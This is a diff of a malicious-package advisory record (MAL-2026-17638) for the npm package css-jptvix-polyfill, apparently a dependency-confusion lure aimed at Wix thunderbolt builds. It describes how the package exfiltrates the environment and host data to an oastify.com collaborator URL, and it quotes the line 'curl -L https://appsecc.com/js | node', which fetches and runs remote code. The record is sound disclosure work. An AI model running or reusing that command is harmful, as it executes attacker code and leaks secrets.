@@ -1,14 +1,15 @@
 {
-  "schema_version": "1.7.4",
-  "published": "2026-10-06T19:51:06Z",
   "modified": "2026-10-06T19:51:06Z",
-  "summary": "css-jptvix-polyfill exfiltrates host/env and executes remote reverse shell on load",
-  "details": "The package ships thunderboltRegistry.js, a Proxy-based shim that exports names mimicking internal Wix thunderbolt modules (thunderboltRegistry, siteAssetsRegistry, editorRegistry, corvidRegistry, documentManagementRegistry, and others) so that any import of those names in a victim build auto-triggers its payload. On load, the module uses child_process.execSync to run `id`, `whoami`, `env`, and `ifconfig`/`ip addr`, and ships the output together with the hostname via fetch to the hardcoded Burp Collaborator subdomain https://orj3tao0ic8oj24h9njymexmtdz5ztphe.oastify.com, leaking the full process environment (including any tokens or secrets present) and host identifiers off the installer's machine. The same IIFE additionally runs `curl -L https://appsecc.com/js | node`, piping attacker-controlled JavaScript from an unrelated third-party domain directly into the installer's Node.js interpreter; the code labels this branch `reverse-shell`. The package name and the Wix-internal registry shape are consistent with a dependency-confusion lure targeting Wix thunderbolt builds.",
+  "published": "2026-10-06T19:51:06Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-17638",
+  "summary": "Malicious code in css-jptvix-polyfill (npm)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (cea61788c370593a2720461d06b74942933d38d30b449851a05541b5b7f189aa)\nThe package ships thunderboltRegistry.js, a Proxy-based shim that exports names mimicking internal Wix thunderbolt modules (thunderboltRegistry, siteAssetsRegistry, editorRegistry, corvidRegistry, documentManagementRegistry, and others) so that any import of those names in a victim build auto-triggers its payload. On load, the module uses child_process.execSync to run `id`, `whoami`, `env`, and `ifconfig`/`ip addr`, and ships the output together with the hostname via fetch to the hardcoded Burp Collaborator subdomain https://orj3tao0ic8oj24h9njymexmtdz5ztphe.oastify.com, leaking the full process environment (including any tokens or secrets present) and host identifiers off the installer's machine. The same IIFE additionally runs `curl -L https://appsecc.com/js | node`, piping attacker-controlled JavaScript from an unrelated third-party domain directly into the installer's Node.js interpreter; the code labels this branch `reverse-shell`. The package name and the Wix-internal registry shape are consistent with a dependency-confusion lure targeting Wix thunderbolt builds.\n",
   "affected": [
     {
       "package": {
-        "name": "css-jptvix-polyfill",
-        "ecosystem": "npm"
+        "ecosystem": "npm",
+        "name": "css-jptvix-polyfill"
       },
       "versions": [
         "1.0.0"
@@ -48,6 +49,15 @@
       "url": "https://www.npmjs.com/package/css-jptvix-polyfill/v/1.0.0"
     }
   ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
   "database_specific": {
     "malicious-packages-origins": [
       {
@@ -61,14 +71,5 @@
         ]
       }
     ]
-  },
-  "credits": [
-    {
-      "name": "Amazon Inspector",
-      "contact": [
-        "inspector-research@amazon.com"
-      ],
-      "type": "FINDER"
-    }
-  ]
+  }
 }
